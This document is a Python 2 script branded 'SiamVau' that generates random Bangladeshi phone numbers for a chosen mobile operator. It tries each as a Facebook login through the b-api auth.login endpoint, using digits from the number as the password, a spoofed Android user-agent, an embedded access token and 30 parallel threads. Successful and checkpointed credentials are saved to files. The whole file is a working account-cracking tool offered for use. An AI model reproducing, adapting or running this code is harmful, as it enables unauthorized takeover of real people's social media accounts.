#-*-coding:utf-8-*-
# coding/utf/python2

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')


for n in range(10000):
    nmbr = random.randint(111111, 999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 SiamVau.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
os.system('clear')
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [
 ('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo = """
\033[1;93m
_____________$$$___________________1$$_
_1$__________$$$___________________$$$1_________$1
_$$$_______$$$$$$_________________1$$$$$1______$$$
_$$$$______$$$$$$$_______________1$$$$$$1_____$$$$
_$$$$$____1$$$$$$$$__SiamVau ____$$$$$$$$$____$$$$$
$$$$$$$1__$$$$$$$$$$___________$$$$$$$$$$__1$$$$$$
$$$$$$$$$1$$$$$$$$$$1_________1$$$$$$$$$$1$$$$$$$$
11$$$$$$$$$$$$$$$$$$$_________1$$$$$$$$$$$$$$$$$$1
11$$$$$$$$$$$$$$$$$$1_________1$$$$$$$$$$$$$$$$$$1
_11$$$$$$$$$$$$$$$$$___________$$$$$$$$$$$$$$$$$$
__1$$$$$$$$$$$$$$$$$1$$$$__.$$$1$$$$$$$$$$$$$$$$
___1$$$$$$$$$$$$$$$$$$$$$♥$$$$$$$$$$$$$$$$$$$$$1
____1$$$$$$$$$$$$$$$$$$1___1$$$$$$$$$$$$$$$$$$1
_____111$$$$$$$$$$$$$$_______$$$$$$$$$$$$$$$$
______11_1$$$$$$$$$$$$_______$$$$$$$$$$$$$11
________11_1$$$$$$$$$$_______1$$$$$$$$$$11
_________11$$$$$$$$$$_________$$$$$$$$$$$1
_1$$$$$$$$$$$$$$$$$$___________1$$$$$$$$$$$$$$$$$1
__$$$$$$$$$$$$$$$11__________1$$$$$$$$$$$$$$$
__1$$$$$$$$$___________________________$$$$$$$$$1
____1$$$$$$1___________________________1$$$$$$1
_______1$$$_____________________________1$$1
_________$_______________________________$
"""


back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    print logo
    print 'ONLY BANGLADESHI ACCOUNTS ARE AVAILABLE'
    print '[1]  \x1b[1;96mGP'
    print '[2]  \x1b[1;92mRobi'
    print '[3]  \x1b[1;96mAirtel'
    print '[4]  \x1b[1;92mBanglalink'
    print '[5]  \x1b[1;93mTeletalk'
    print '[0]  \x1b[1;95mExit            '
    print 50 * '-'
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n  ===>   ')
    if bch == '':
        print
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print 'just'
        try:
            c = raw_input(' Choose Code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '2':
        os.system('clear')
        print logo
        print '180,181, 182, 183, 184, 185, 186, 187, 188, 189'
        try:
            c = raw_input(' Choose Code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '3':
        os.system('clear')
        print logo
        print '160,161, 162, 163, 164, 165, 166, 167, 168, 169'
        try:
            c = raw_input(' Choose Code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '4':
        os.system('clear')
        print logo
        print '190,191, 192, 193, 194, 195, 196, 197, 198, 199,140,141, 142, 143, 144, 145, 146, 147, 148, 149'
        try:
            c = raw_input(' Choose Code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '5':
        os.system('clear')
        print logo
        print '150,151, 152, 153, 154, 155, 156, 157, 158, 159'
        try:
            c = raw_input(' Choose Code  : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '0':
        exb()
    else:
        print
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Please wait, process is running ...')
    time.sleep(0.5)
    psb('[!] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    psb(50 * '-')
    time.sleep(0.5)
    print
    50 * '-'
    print

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            result = k + c + user
            digi7 = result[7:14]
            pass1 = digi7
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[Siam-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[Siam-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m                   [Open After 3 Days]\x1b[0m \n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print
    50 * '-'
    print
    print
    '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 SiamVau.py')


if __name__ == '__main__':
    menu()
